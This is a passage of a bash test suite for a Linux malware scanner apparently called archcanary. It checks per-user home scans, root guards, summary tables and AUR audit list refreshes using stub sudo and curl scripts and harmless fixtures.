    mkdir -p "$scratch/alice" "$scratch/bob"
    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/zsh
EOF

    local out rc=0
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_USER_OPTS=(alice bob)
        _resolve_and_store_scan_users
        printf '%s\n' \"\${_SAH_RESOLVED_USERS[@]}\"
    " 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == "alice:$scratch/alice"$'\n'"bob:$scratch/bob" ]]; then
        pass "resolve_and_store_scan_users: populates _SAH_RESOLVED_USERS for valid names"
    else
        fail "resolve_and_store_scan_users: expected alice+bob resolved, rc=$rc, out: $out"
    fi

    rc=0
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_USER_OPTS=()
        _resolve_and_store_scan_users
        echo \"count=\${#_SAH_RESOLVED_USERS[@]}\"
    " 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == "count=0" ]]; then
        pass "resolve_and_store_scan_users: no-op (empty, no error) when SCAN_USER_OPTS is empty"
    else
        fail "resolve_and_store_scan_users: expected a clean no-op with empty SCAN_USER_OPTS, rc=$rc, out: $out"
    fi

    rc=0
    out=$(bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        SCAN_USER_OPTS=(ghost)
        _resolve_and_store_scan_users
    " 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"'ghost' is not a known local user"* ]]; then
        pass "resolve_and_store_scan_users: propagates the hard error for an unknown username"
    else
        fail "resolve_and_store_scan_users: expected unknown-user error, rc=$rc, out: $out"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

# ---------------------------------------------------------------------------
# The "--- [10b] ... ---" section header must list the deduped names
# actually scanned (from _SAH_RESOLVED_USERS), not the raw, possibly
# repeated SCAN_USER_OPTS CLI array -- /code-review found
# --scan-user=bob --scan-user=alice --scan-user=bob printed "bob alice bob"
# even though only one child scan and one "Check summary: USER bob" table
# ever happen.
# ---------------------------------------------------------------------------
test_sah_section_header_deduped_names() {
    local fns
    fns=$(mktemp)
    _sah_extract_fns > "$fns"

    local out
    out=$(bash -c "
        source '$fns'
        SCAN_ALL_HOMES=false
        _SAH_RESOLVED_USERS=(bob:/home/bob alice:/home/alice)
        _print_sah_section_header
    ")
    if [[ "$out" == "--- [10b] Scan user home(s): bob alice (npm/bun/yarn/pnpm/pkgbuild/autostart) ---" ]]; then
        pass "sah_section_header: lists deduped names from _SAH_RESOLVED_USERS, not raw SCAN_USER_OPTS"
    else
        fail "sah_section_header: expected 'bob alice' (deduped), out: $out"
    fi

    out=$(bash -c "
        source '$fns'
        SCAN_ALL_HOMES=true
        _SAH_RESOLVED_USERS=()
        _print_sah_section_header
    ")
    if [[ "$out" == "--- [10b] Scan all local user homes (npm/bun/yarn/pnpm/pkgbuild/autostart) ---" ]]; then
        pass "sah_section_header: --scan-all-homes wording unaffected"
    else
        fail "sah_section_header: expected the scan-all-homes header, out: $out"
    fi

    rm -f "$fns"
}

test_scan_all_homes_worst_of_n() {
    local fns scratch fake_bin fake_passwd empty_list
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    fake_bin="$scratch/bin"
    mkdir -p "$scratch/alice" "$scratch/bob/.config/autostart" "$scratch/carol" "$fake_bin"

    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/bash
carol:x:1002:1002::$scratch/carol:/bin/bash
EOF

    cat > "$scratch/bob/.config/autostart/evil.desktop" <<EOF
[Desktop Entry]
Type=Application
Name=Suspicious
Exec=$scratch/does-not-exist-binary
EOF

    # Fake sudo: -H -u <user> -- <cmd...>. carol's invocation fails outright
    # (simulates a real sudo/auth failure) so the "no parseable output ->
    # WARNING, not silent CLEAN" path gets exercised too.
    cat > "$fake_bin/sudo" <<EOF
#!/usr/bin/env bash
shift; shift
user="\$1"; shift
shift
if [[ "\$user" == carol ]]; then
    exit 1
fi
home=\$(awk -F: -v u="\$user" '\$1==u{print \$6}' "$fake_passwd")
HOME="\$home" exec "\$@"
EOF
    chmod +x "$fake_bin/sudo"

    empty_list="$scratch/empty_list.txt"
    echo "nonexistent-malicious-pkg-xyz" > "$empty_list"

    local out
    out=$(PATH="$fake_bin:$PATH" bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        _SCAN_ALL_HOMES_TEST_BIN='$REPO_DIR/archcanary.sh'
        EXIT_CODE=0
        _SUMMARY_NAMES=(); _SUMMARY_CODES=(); _SUMMARY_IDX=()
        _rec() { _SUMMARY_NAMES+=(\"\$1\"); _SUMMARY_CODES+=(\"\$2\"); _SUMMARY_IDX+=(\"\${3:-}\"); }
        MALICIOUS_NPM_LIST='$empty_list'
        PACKAGE_LIST_FILE='$empty_list'
        CHAOS_RAT_LIST='$empty_list'
        RUSSIAN_SPAM_LIST='$empty_list'
        COMMUNITY_REPORTS_LIST='$empty_list'
        _run_scan_all_homes
        for i in \"\${!_SUMMARY_NAMES[@]}\"; do
            echo \"\${_SUMMARY_NAMES[\$i]}=\${_SUMMARY_CODES[\$i]}\"
        done
        echo \"EXIT_CODE=\$EXIT_CODE\"
    " 2>&1)

    if [[ "$out" == *"XDG autostart + shell RCs=2"* ]]; then
        pass "scan_all_homes: worst-of-N reflects the flagged user's autostart finding"
    else
        fail "scan_all_homes: expected 'XDG autostart + shell RCs=2', out: $out"
    fi
    if [[ "$out" == *"npm cache=0"* ]]; then
        pass "scan_all_homes: an unrelated check stays clean when no user triggers it"
    else
        fail "scan_all_homes: expected 'npm cache=0', out: $out"
    fi
    if [[ "$out" == *"=== user: alice"* && "$out" == *"=== user: bob"* ]]; then
        pass "scan_all_homes: narrative log includes per-user sections"
    else
        fail "scan_all_homes: expected per-user narrative sections, out: $out"
    fi
    if [[ "$out" == *"WARNING: no log produced for carol"* || \
          "$out" == *"WARNING: could not evaluate result for carol"* ]]; then
        pass "scan_all_homes: a failed per-user subprocess is reported as WARNING, not silently CLEAN"
    else
        fail "scan_all_homes: expected a WARNING for carol's failed subprocess, out: $out"
    fi
    if [[ "$out" == *"EXIT_CODE=2"* ]]; then
        pass "scan_all_homes: EXIT_CODE reflects the worst finding across all users"
    else
        fail "scan_all_homes: expected EXIT_CODE=2, out: $out"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

test_scan_all_homes_root_guard() {
    local out rc=0
    out=$("$REPO_DIR/archcanary.sh" --scan-all-homes 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"--scan-all-homes/--scan-user requires root"* ]]; then
        pass "scan_all_homes: non-root invocation rejected with a clear error"
    else
        fail "scan_all_homes: expected root-required rejection, rc=$rc, out: $out"
    fi

    # --doctor bypasses the guard (nothing root-requiring actually runs) and
    # instead reports the flag as ignored, matching --refresh/--full's
    # existing "ignored under --doctor" convention.
    rc=0
    out=$("$REPO_DIR/archcanary.sh" --doctor --scan-all-homes 2>&1) || rc=$?
    if [[ "$out" == *"following flags are ignored with --doctor"*"--scan-all-homes"* ]]; then
        pass "scan_all_homes: --doctor --scan-all-homes bypasses the root guard, reports as ignored"
    else
        fail "scan_all_homes: expected --doctor to bypass the guard and report ignored flag, rc=$rc, out: $out"
    fi
}

test_scan_all_homes_flag_wiring() {
    local out rc=0
    out=$("$REPO_DIR/archcanary.sh" --full \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --no-notify --no-summary 2>&1) || rc=$?
    if [[ "$out" != *"--scan-all-homes requires root"* ]]; then
        pass "scan_all_homes: --full does not implicitly enable --scan-all-homes"
    else
        fail "scan_all_homes: --full incorrectly triggered the --scan-all-homes root guard, out: $out"
    fi
}

test_scan_user_cli_flags() {
    local out rc=0

    # Same root guard as --scan-all-homes, worded to cover both flags.
    out=$("$REPO_DIR/archcanary.sh" --scan-user=alice 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"--scan-all-homes/--scan-user requires root"* ]]; then
        pass "scan_user: non-root invocation rejected with a clear error"
    else
        fail "scan_user: expected root-required rejection, rc=$rc, out: $out"
    fi

    # --doctor bypasses the guard, same convention as --scan-all-homes.
    rc=0
    out=$("$REPO_DIR/archcanary.sh" --doctor --scan-user=alice 2>&1) || rc=$?
    if [[ "$out" == *"following flags are ignored with --doctor"*"--scan-user"* ]]; then
        pass "scan_user: --doctor --scan-user bypasses the root guard, reports as ignored"
    else
        fail "scan_user: expected --doctor to bypass the guard and report ignored flag, rc=$rc, out: $out"
    fi

    # Combining both is ambiguous (scan everyone vs. scan just these) --
    # rejected before the root guard even runs, so this is testable non-root.
    rc=0
    out=$("$REPO_DIR/archcanary.sh" --scan-all-homes --scan-user=alice 2>&1) || rc=$?
    if [[ $rc -eq 1 && "$out" == *"mutually exclusive"* ]]; then
        pass "scan_user: --scan-all-homes + --scan-user together rejected as mutually exclusive"
    else
        fail "scan_user: expected mutual-exclusion rejection, rc=$rc, out: $out"
    fi
}

# ---------------------------------------------------------------------------
# scan_all_homes must not leak the invoking (root/sudo) process's own list
# paths into other users' child scans. Regression coverage for a real bug:
# `sudo archcanary --scan-all-homes`'s $MALICIOUS_NPM_LIST/$PACKAGE_LIST_FILE/
# etc. resolve to the SUDO_USER's own $HOME/.config/archcanary (via the
# HOME-rebind earlier in the script) -- fine for that user's own child scan,
# but a second real account (e.g. a freshly-created `leonie`) has no access
# into the first user's home. Passing those paths through via
# --malicious-npm-list=/--package-list=/etc made the file look "missing" to
# every other user, and the self-heal bundled-default `cp` then also failed
# (no write access into someone else's home), producing an unparseable
# WARNING for every user but the invoking one. Fix: don't pass those flags at
# all -- each child resolves its own list paths from its own $HOME, same as
# a standalone run or archcanary-user.service.
# ---------------------------------------------------------------------------
test_scan_all_homes_no_cross_user_list_paths() {
    local fns scratch fake_bin fake_passwd argv_log
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    fake_bin="$scratch/bin"
    mkdir -p "$scratch/alice" "$scratch/bob" "$fake_bin"

    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/bash
EOF

    argv_log="$scratch/argv.log"
    # Fake sudo: -H -u <user> -- <cmd...>. Logs the full argv it was asked to
    # run instead of execing anything -- this test only cares what
    # _run_scan_all_homes decided to pass, not a child's actual scan result.
    cat > "$fake_bin/sudo" <<EOF
#!/usr/bin/env bash
shift; shift
user="\$1"; shift
shift
{ printf 'user=%s' "\$user"; printf ' %q' "\$@"; printf '\n'; } >> "$argv_log"
echo '{}'
EOF
    chmod +x "$fake_bin/sudo"

    # Realistic invoking-process state: paths rebound into one real user's
    # home, exactly like $MALICIOUS_NPM_LIST etc. after the SUDO_USER
    # HOME-rebind in the real report.
    PATH="$fake_bin:$PATH" bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        _SCAN_ALL_HOMES_TEST_BIN='/usr/bin/true'
        EXIT_CODE=0
        _rec() { :; }
        MALICIOUS_NPM_LIST='/home/vogel/.config/archcanary/malicious_npm_packages.txt'
        PACKAGE_LIST_FILE='/home/vogel/.config/archcanary/package_list.txt'
        CHAOS_RAT_LIST='/home/vogel/.config/archcanary/chaos_rat_packages.txt'
        RUSSIAN_SPAM_LIST='/home/vogel/.config/archcanary/malicious_russian_spam_packages.txt'
        COMMUNITY_REPORTS_LIST='/home/vogel/.config/archcanary/community_reports.txt'
        _run_scan_all_homes
    " >/dev/null 2>&1

    local argv
    argv=$(cat "$argv_log" 2>/dev/null)
    if [[ "$argv" == *"user=alice"* && "$argv" == *"user=bob"* && \
          "$argv" != *"--malicious-npm-list"* && "$argv" != *"--package-list"* && \
          "$argv" != *"--chaos-rat-list"* && "$argv" != *"--russian-spam-list"* && \
          "$argv" != *"--community-list"* ]]; then
        pass "scan_all_homes: per-user child invocations don't leak the invoking user's list paths"
    else
        fail "scan_all_homes: expected no --*-list flags in child invocations, argv: $argv"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

# ---------------------------------------------------------------------------
# _run_scan_all_homes must scan exactly the users named via SCAN_USER_OPTS,
# not fall back to enumerating everyone -- the whole point of --scan-user
# over --scan-all-homes is scoping down to specific accounts.
# ---------------------------------------------------------------------------
test_scan_user_targets_named_users_only() {
    local fns scratch fake_bin fake_passwd argv_log
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    fake_bin="$scratch/bin"
    mkdir -p "$scratch/alice" "$scratch/bob" "$scratch/carol" "$fake_bin"

    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/bash
carol:x:1002:1002::$scratch/carol:/bin/bash
EOF

    argv_log="$scratch/argv.log"
    cat > "$fake_bin/sudo" <<EOF
#!/usr/bin/env bash
shift; shift
user="\$1"; shift
shift
printf 'user=%s\n' "\$user" >> "$argv_log"
echo '{}'
EOF
    chmod +x "$fake_bin/sudo"

    PATH="$fake_bin:$PATH" bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        _SCAN_ALL_HOMES_TEST_BIN='/usr/bin/true'
        EXIT_CODE=0
        _rec() { :; }
        SCAN_USER_OPTS=(carol alice carol)
        _resolve_and_store_scan_users
        _run_scan_all_homes
    " >/dev/null 2>&1

    local argv
    argv=$(cat "$argv_log" 2>/dev/null)
    local carol_count
    carol_count=$(grep -c '^user=carol$' "$argv_log" 2>/dev/null || true)
    if [[ "$argv" == *"user=carol"* && "$argv" == *"user=alice"* && \
          "$argv" != *"user=bob"* && "$carol_count" -eq 1 ]]; then
        pass "scan_user: only the named users are scanned, repeats collapsed to one invocation each"
    else
        fail "scan_user: expected exactly carol+alice (deduped, no bob), argv: $argv"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

# ---------------------------------------------------------------------------
# _run_scan_all_homes must capture each user's own PER-CHECK results (not
# just a coarse overall verdict) into _SAH_USER_NAMES/_SAH_USER_CHECKS, and
# _print_sah_per_user_checks must render one full check-by-check table per
# user -- clean/warning render plainly, a code-2 behavior-based check
# (PKGBUILD obfuscation scan) renders as REVIEW while a code-2 non-behavior
# one (npm cache) renders as INFECTED (same _is_behavior_check_name
# distinction _print_summary uses), and a child that produced no parseable
# output at all (the existing "could not evaluate" narrative path) gets a
# one-line fallback instead of a table of blanks.
# ---------------------------------------------------------------------------
test_scan_user_per_user_checks() {
    local fns scratch fake_bin fake_passwd
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    fake_bin="$scratch/bin"
    mkdir -p "$scratch/alice" "$scratch/bob" "$scratch/carol" "$scratch/dave" "$fake_bin"

    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
bob:x:1001:1001::$scratch/bob:/bin/bash
carol:x:1002:1002::$scratch/carol:/bin/bash
dave:x:1003:1003::$scratch/dave:/bin/bash
EOF

    # Fake sudo hands back canned per-check JSON instead of running a real
    # scan. carol's invocation fails outright (exit 1, no output) to
    # exercise the "could not evaluate" fallback.
    cat > "$fake_bin/sudo" <<'EOF'
#!/usr/bin/env bash
shift; shift
user="$1"; shift
shift
clean6='[{"name":"npm cache","status":"clean"},{"name":"bun cache","status":"clean"},{"name":"yarn cache","status":"clean"},{"name":"pnpm cache","status":"clean"},{"name":"PKGBUILD obfuscation scan","status":"clean"},{"name":"XDG autostart + shell RCs","status":"clean"}]'
case "$user" in
    alice) echo "{\"result\":\"clean\",\"checks\":$clean6}" ;;
    bob)   echo '{"result":"warnings","checks":[{"name":"npm cache","status":"clean"},{"name":"bun cache","status":"clean"},{"name":"yarn cache","status":"clean"},{"name":"pnpm cache","status":"clean"},{"name":"PKGBUILD obfuscation scan","status":"clean"},{"name":"XDG autostart + shell RCs","status":"warning"}]}' ;;
    carol) exit 1 ;;
    dave)  echo '{"result":"infected","checks":[{"name":"npm cache","status":"infected"},{"name":"bun cache","status":"clean"},{"name":"yarn cache","status":"clean"},{"name":"pnpm cache","status":"clean"},{"name":"PKGBUILD obfuscation scan","status":"infected"},{"name":"XDG autostart + shell RCs","status":"clean"}]}' ;;
esac
EOF
    chmod +x "$fake_bin/sudo"

    local out
    out=$(PATH="$fake_bin:$PATH" bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        _SCAN_ALL_HOMES_TEST_BIN='/usr/bin/true'
        EXIT_CODE=0
        _rec() { :; }
        SCAN_USER_OPTS=(alice bob carol dave)
        _resolve_and_store_scan_users
        _run_scan_all_homes >/dev/null
        _SEP55='-----'
        _SYM_CLEAN='CLEAN_ICON'
        _SYM_WARNINGS='WARN_ICON'
        _SYM_REVIEW_TXT='REVIEW_ICON'
        _SYM_INFECTED_TXT='INFECTED_ICON'
        _print_sah_per_user_checks
    " 2>&1)

    if [[ "$out" == *"Check summary: USER alice"* && "$out" == *"Check summary: USER bob"* && \
          "$out" == *"Check summary: USER carol"* && "$out" == *"Check summary: USER dave"* && \
          "$out" =~ 'XDG autostart + shell RCs'[[:space:]]+WARN_ICON && \
          "$out" == *"carol"*"(could not evaluate"* && \
          "$out" =~ 'npm cache'[[:space:]]+INFECTED_ICON && \
          "$out" =~ 'PKGBUILD obfuscation scan'[[:space:]]+REVIEW_ICON ]]; then
        pass "scan_user: per-user check tables render per-check detail, correct REVIEW/INFECTED split, and could-not-evaluate fallback"
    else
        fail "scan_user: expected 4 per-user tables with correct icons/fallback, out: $out"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

# ---------------------------------------------------------------------------
# Regression coverage for a real report: `--scan-user=a --check-ldso
# --scan-user=b --check-ldso` made check_ldso's own result vanish from the
# final output entirely -- _print_sah_per_user_checks only ever covers the
# six per-user checks, so a general/machine-wide check (ld.so.preload,
# systemd, kmod, ...) recorded via the normal _rec path had nowhere left to
# render once _print_summary itself stopped being called for --scan-user.
# _print_summary_general_only must still show it, in its own "Check summary"
# table above the per-user ones -- and must print nothing at all when there
# is no such general check (bare --scan-user, the common case).
# ---------------------------------------------------------------------------
test_scan_user_general_check_still_shown() {
    local fns scratch fake_bin fake_passwd
    fns=$(mktemp)
    _sah_extract_fns > "$fns"
    scratch=$(mktemp -d)
    fake_bin="$scratch/bin"
    mkdir -p "$scratch/alice" "$fake_bin"

    fake_passwd="$scratch/passwd"
    cat > "$fake_passwd" <<EOF
alice:x:1000:1000::$scratch/alice:/bin/bash
EOF

    cat > "$fake_bin/sudo" <<'EOF'
#!/usr/bin/env bash
shift; shift; shift; shift
echo '{"result":"clean","checks":[{"name":"npm cache","status":"clean"},{"name":"bun cache","status":"clean"},{"name":"yarn cache","status":"clean"},{"name":"pnpm cache","status":"clean"},{"name":"PKGBUILD obfuscation scan","status":"clean"},{"name":"XDG autostart + shell RCs","status":"clean"}]}'
EOF
    chmod +x "$fake_bin/sudo"

    local out
    out=$(PATH="$fake_bin:$PATH" bash -c "
        source '$fns'
        _SCAN_ALL_HOMES_TEST_PASSWD='$fake_passwd'
        _SCAN_ALL_HOMES_TEST_BIN='/usr/bin/true'
        EXIT_CODE=0
        _SUMMARY_NAMES=(); _SUMMARY_CODES=(); _SUMMARY_IDX=()
        _rec() { _SUMMARY_NAMES+=(\"\$1\"); _SUMMARY_CODES+=(\"\$2\"); _SUMMARY_IDX+=(\"\${3:-}\"); }
        _SEP55='-----'
        _SYM_CLEAN='CLEAN_ICON'
        SCAN_USER_OPTS=(alice)
        _resolve_and_store_scan_users
        _run_scan_all_homes >/dev/null
        echo '===bare==='
        _print_summary_general_only
        _rec 'ld.so.preload injection' 0 '9'
        echo '===with-general==='
        _print_scan_summary_section
    " 2>&1)

    local bare with_general
    bare=$(sed -n '/===bare===/,/===with-general===/p' <<< "$out")
    with_general=$(sed -n '/===with-general===/,$p' <<< "$out")

    if [[ "$bare" != *"Check summary"* && \
          "$with_general" == *"Check summary (system-wide, not per-user)"* && \
          "$with_general" =~ 'ld.so.preload injection'[[:space:]]+CLEAN_ICON && \
          "$with_general" == *"Check summary: USER alice"* ]]; then
        pass "scan_user: a general (non-per-user) check alongside --scan-user still gets its own labeled summary table, and none prints when there isn't one"
    else
        fail "scan_user: expected no table for bare --scan-user and a general table + per-user table when combined, out: $out"
    fi

    rm -f "$fns"
    rm -rf "$scratch"
}

# ---------------------------------------------------------------------------
# The per-user tables must be wired to --scan-user only, never
# --scan-all-homes -- _print_scan_summary_section is the sole dispatcher
# (named, not inlined, specifically so this is unit-testable without root).
# ---------------------------------------------------------------------------
test_scan_user_summary_scope() {
    local fns
    fns=$(mktemp)
    _sah_extract_fns > "$fns"

    local out
    out=$(bash -c "
        source '$fns'
        _print_sah_per_user_checks() { echo PER_USER; }
        _print_summary() { echo SHARED; }
        SCAN_USER_OPTS=()
        echo \"empty=[\$(_print_scan_summary_section)]\"
        SCAN_USER_OPTS=(alice)
        echo \"set=[\$(_print_scan_summary_section)]\"
    ")

    if [[ "$out" == *"empty=[SHARED]"* && "$out" == *"set=[PER_USER]"* ]]; then
        pass "scan_user: per-user tables shown only when SCAN_USER_OPTS is non-empty; shared table otherwise (--scan-all-homes unaffected)"
    else
        fail "scan_user: expected shared table with empty SCAN_USER_OPTS and per-user table once set, out: $out"
    fi

    rm -f "$fns"
}

# ---------------------------------------------------------------------------
# --scan-user/--scan-all-homes interact silently with several other flags --
# _warn_scan_homes_flag_interactions must fire the right NOTE for each,
# fire nothing at all when none apply (the common case), and each NOTE must
# be independent of the others (only the conditions actually true fire).
# ---------------------------------------------------------------------------
test_warn_scan_homes_flag_interactions() {
    local fns
    fns=$(mktemp)
    _sah_extract_fns > "$fns"

    local out
    out=$(bash -c "
        source '$fns'
        CHECK_NPM_CACHE=true CHECK_BUN_CACHE=false CHECK_YARN_CACHE=false
        CHECK_PNPM_CACHE=false CHECK_PKGBUILD=false CHECK_AUTOSTART=true
        PACKAGE_LIST_FILE_OPT='' MALICIOUS_NPM_LIST_OPT='/tmp/custom-npm.txt'
        CHAOS_RAT_LIST_OPT='' RUSSIAN_SPAM_LIST_OPT='' COMMUNITY_LIST_OPT=''
        REFRESH_PACKAGE_LIST=true
        VERBOSE=true
        LOG_FILE='/tmp/custom.log'
        FORMAT_JSON=true
        _warn_scan_homes_flag_interactions
    " 2>&1)

    if [[ "$out" == *"--check-npm-cache"*"--check-autostart"*"add nothing extra"* && \
          "$out" == *"--malicious-npm-list="*"only applies to your own checks"* && \
          "$out" == *"--refresh only refreshes your own lists"* && \
          "$out" == *"--verbose/--debug only affects your own output"* && \
          "$out" == *"--log-file only applies to this summary"* && \
          "$out" == *"--format=json has no per-user breakdown"* ]]; then
        pass "warn_scan_homes: all six flag-interaction NOTEs fire when their condition is true"
    else
        fail "warn_scan_homes: expected all six NOTEs, out: $out"
    fi

    local quiet
    quiet=$(bash -c "
        source '$fns'
        CHECK_NPM_CACHE=false CHECK_BUN_CACHE=false CHECK_YARN_CACHE=false
        CHECK_PNPM_CACHE=false CHECK_PKGBUILD=false CHECK_AUTOSTART=false
        PACKAGE_LIST_FILE_OPT='' MALICIOUS_NPM_LIST_OPT='' CHAOS_RAT_LIST_OPT=''
        RUSSIAN_SPAM_LIST_OPT='' COMMUNITY_LIST_OPT=''
        REFRESH_PACKAGE_LIST=false
        VERBOSE=false
        LOG_FILE=''
        FORMAT_JSON=false
        _warn_scan_homes_flag_interactions
    " 2>&1)

    if [[ -z "$quiet" ]]; then
        pass "warn_scan_homes: bare --scan-user (nothing else set) prints no NOTEs"
    else
        fail "warn_scan_homes: expected no output with nothing set, out: $quiet"
    fi

    rm -f "$fns"
}

# ---------------------------------------------------------------------------
# _refresh_aur_audit — RED-only versions companion file. Regression coverage
# for the name-only-forever bug: a package's aur-audit RED verdict belongs to
# a specific version, but configs/yay-init.lua's Lua hook only ever matched
# by name, so it kept warning on every future install of that name even
# after a newer version was rescanned clean (reported live on firefox-pure).
# --refresh now also captures wtako's "version" field into
# aur_audit_red_versions.txt (RED only -- BLACK stays unconditional, no
# versions file). No CURL_CMD-style override exists for this script, so this
# stubs curl itself via a fake binary on $PATH, same technique as the fake
# pacman/dkms scripts above.
# ---------------------------------------------------------------------------
test_refresh_aur_audit_versions() {
    local tmpdir fake_bin
    tmpdir=$(mktemp -d)
    fake_bin=$(mktemp -d)

    cat > "$fake_bin/curl" << 'FAKECURL'
#!/bin/sh
case "$*" in
    *aur-audit.wtako.net*filter=red*)
        # Second entry has no "version" field -- regression coverage for a
        # real bug: the live feed has some entries missing this field, and
        # an earlier version of this extraction silently dropped the WHOLE
        # page (not just the sparse entry) whenever any count mismatched,
        # then a fix attempt crashed the whole --refresh outright under
        # set -e/pipefail when grep found no match on a sparse object.
        printf '%s' '{"packages":[{"guid":"zzz-test-refresh-red-1785585570","packageName":"zzz-test-refresh-red","pubDateTs":1785585570000,"version":"9.9.9-1"},{"guid":"zzz-test-refresh-red-sparse-1785585571","packageName":"zzz-test-refresh-red-sparse","pubDateTs":1785585571000}]}'
        ;;
    *aur-audit.wtako.net*filter=black*)
        printf '%s' '{"packages":[{"guid":"zzz-test-refresh-black-1785585570","packageName":"zzz-test-refresh-black","pubDateTs":1785585570000,"version":"1.1.1-1"}]}'
        ;;
    *)
        printf '%s\n' zzz-test-refresh-dummy
        ;;
esac
FAKECURL
    chmod +x "$fake_bin/curl"

    local redlist reddates redversions blacklist blackdates
    redlist="$tmpdir/aur_audit_red.txt"
    reddates="$tmpdir/aur_audit_red_dates.txt"
    redversions="$tmpdir/aur_audit_red_versions.txt"
    blacklist="$tmpdir/aur_audit_black.txt"
    blackdates="$tmpdir/aur_audit_black_dates.txt"

    local out rc=0
    out=$(PATH="$fake_bin:$PATH" \
        AUR_AUDIT_RED_LIST="$redlist" AUR_AUDIT_RED_DATES_LIST="$reddates" \
        AUR_AUDIT_RED_VERSIONS_LIST="$redversions" \
        AUR_AUDIT_BLACK_LIST="$blacklist" AUR_AUDIT_BLACK_DATES_LIST="$blackdates" \
        PACKAGE_LIST_FILE="$tmpdir/package_list.txt" \
        MALICIOUS_NPM_LIST="$tmpdir/malicious_npm.txt" \
        CHAOS_RAT_LIST="$tmpdir/chaos_rat.txt" \
        RUSSIAN_SPAM_LIST="$tmpdir/russian_spam.txt" \
        COMMUNITY_REPORTS_LIST="$tmpdir/community_reports.txt" \
        EXTRA_LISTS_CONF="$tmpdir/extra_lists.conf" \
        "$REPO_DIR/archcanary.sh" --refresh --no-notify --no-summary 2>&1) || rc=$?

    # A sparse entry (no version field) must not abort the whole --refresh
    # under set -e/pipefail (the actual bug this fixture caught live) --
    # verified by the next two checks actually finding file content at all,
    # since a mid-loop abort would leave $redversions unwritten entirely.
    if grep -qxF "zzz-test-refresh-red 9.9.9-1" "$redversions" 2>/dev/null; then
        pass "_refresh_aur_audit: RED versions companion file captures wtako's version field"
    else
        fail "_refresh_aur_audit: RED versions file missing/wrong content, rc=$rc, out: $out"
    fi

    if ! grep -q "^zzz-test-refresh-red-sparse " "$redversions" 2>/dev/null; then
        pass "_refresh_aur_audit: sparse entry (no version field) is skipped, not misattributed"
    else
        fail "_refresh_aur_audit: sparse entry got a version line it shouldn't have, out: $(cat "$redversions")"
    fi

    if ! compgen -G "$tmpdir"'/*black*version*' > /dev/null; then
        pass "_refresh_aur_audit: BLACK gets no versions companion file (untouched)"
    else
        fail "_refresh_aur_audit: unexpected BLACK versions file written"
    fi

    rm -rf "$tmpdir" "$fake_bin"
}

# ---------------------------------------------------------------------------
# _refresh_aur_audit — a versions capture that comes back empty must CLEAR
# aur_audit_red_versions.txt, not leave a prior refresh's data in place.
# Unlike the plain names/dates lists (which intentionally keep stale data on
# a failed/empty fetch -- still-useful threat data, same severity either
# way), a stale flagged-version line drives an active severity *downgrade* in
# configs/yay-init.lua (full warning vs. "different version, might be
# stale"). Found by /code-review: trusting old version data here could
# understate severity for a package now flagged at the very version being
# installed. On doubt, must fail toward the conservative default (no data ->
# full warning), never toward stale-and-silently-softened.
# ---------------------------------------------------------------------------
test_refresh_aur_audit_versions_stale_clear() {
    local tmpdir fake_bin
    tmpdir=$(mktemp -d)
    fake_bin=$(mktemp -d)

    cat > "$fake_bin/curl" << 'FAKECURL'
#!/bin/sh
case "$*" in
    *aur-audit.wtako.net*filter=red*)
        # No "version" field on this round -- simulates the upstream field
        # disappearing/reformatting between refreshes.
        printf '%s' '{"packages":[{"guid":"zzz-test-refresh-stale-1785585570","packageName":"zzz-test-refresh-stale","pubDateTs":1785585570000}]}'
        ;;
    *aur-audit.wtako.net*filter=black*)
        printf '%s' '{"packages":[]}'
        ;;
    *)
        printf '%s\n' zzz-test-refresh-dummy
        ;;
esac
FAKECURL
    chmod +x "$fake_bin/curl"

    local redlist reddates redversions blacklist blackdates
    redlist="$tmpdir/aur_audit_red.txt"
    reddates="$tmpdir/aur_audit_red_dates.txt"
    redversions="$tmpdir/aur_audit_red_versions.txt"
    blacklist="$tmpdir/aur_audit_black.txt"
    blackdates="$tmpdir/aur_audit_black_dates.txt"

    # Pre-seed a stale entry from an earlier, successful refresh.
    printf 'zzz-test-refresh-stale 1.0.0-1\n' > "$redversions"

    out=$(PATH="$fake_bin:$PATH" \
